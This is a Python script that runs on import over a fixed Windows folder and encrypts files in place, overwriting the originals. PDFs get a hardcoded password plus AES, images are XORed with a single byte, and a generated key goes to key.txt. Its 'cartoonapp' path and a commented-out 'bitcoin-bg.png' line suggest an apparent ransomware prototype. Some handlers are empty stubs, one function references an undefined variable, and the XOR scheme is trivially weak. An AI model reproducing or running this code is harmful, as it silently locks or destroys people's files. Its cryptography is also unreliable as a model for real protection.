import os 
import numpy as np
from io import BytesIO
import pyAesCrypt
from PIL import Image
from PyPDF4 import PdfFileReader, PdfFileWriter,utils
from cryptography.fernet import Fernet 

t=os.chdir(r'C:\Users\lakshu\Desktop\cartoonapp\encrypt')
key=Fernet.generate_key()
key2=56
password="pdfpass"
BUFFER_SIZE = 64*1024

with open("key.txt",'wb') as f:
    f.write(key)
fernet=Fernet(key)

def encryptxlsx(file):
    pass

def encryptpdf(file):
    pdf_writer = PdfFileWriter()
    pdf_reader = PdfFileReader(open(file, 'rb'), strict=False)
    try:
        for pagen in range(pdf_reader.numPages):
            pdf_writer.addPage(pdf_reader.getPage(pagen))
    except utils.PdfReadError as e:
        print("Error reading file =",e)
    pdf_writer.encrypt(user_pwd=password,owner_pwd=None,use_128bit=True)
    output_file = file
    output_buffer = BytesIO()
    pdf_writer.write(output_buffer)
    pdf_reader.stream.close()
    output_buffer = cipher_stream(output_buffer, password=password)
    with open(output_file, mode='wb') as f:
        f.write(output_buffer.getbuffer())
        f.close()
def cipher_stream(inp_buffer: BytesIO, password: str):
    """Ciphers an input memory buffer and returns a ciphered output memory buffer"""
    # Initialize output ciphered binary stream
    out_buffer = BytesIO()
    inp_buffer.seek(0)
    # Encrypt Stream
    pyAesCrypt.encryptStream(inp_buffer, out_buffer, password, BUFFER_SIZE)
    out_buffer.seek(0)
    return out_buffer
def encryptimages(file,i):
    input=open(file,'rb')
    image=input.read()
    image=bytearray(image)
    for i,v in enumerate(image):
        image[i]= v ^ key2
    f=open(file,'wb')
    f.write(image)
    f.close()
    print("Image encrypt done with key=",key2)

    # encryptedfile=fernet.encrypt(input)
    # newinput=Image.open(file)
    # newinput=np.asarray(newinput)
    # newinput.write(encryptedfile)
    # newinput.close()
    # input.close()
    # with open('encryptedimages_{0}.txt'.format(i),'wb') as f:
    #     f.write(encryptedfile)
   
def encrypttxt(file):
    pass
for i,file in enumerate(os.listdir(t)):
    if file.endswith(".txt"):
        encrypttxt(file)
    elif file.endswith(".pdf"):
        print("going into PDF Encryption")
        encryptpdf(file)
        print("PDF Encryption Done")
    elif file.endswith(".jpg"):
        encryptimages(file,i)
    elif file.endswith(".png"):
        encryptimages(file,i)
    elif file.endswith(".xlsx"):
        encryptxlsx(file)
# with open('bitcoin-bg.png','r') as f:
#     print("\n"+f)
def startencrypt(file):
    if file.endswith(".txt"):
        encrypttxt(file)
    elif file.endswith(".pdf"):
        print("going into PDF Encryption")
        encryptpdf(file)
        print("PDF Encryption Done")
    elif file.endswith(".jpg"):
        encryptimages(file,i)
    elif file.endswith(".png"):
        encryptimages(file,i)
    elif file.endswith(".xlsx"):
        encryptxlsx(file)
    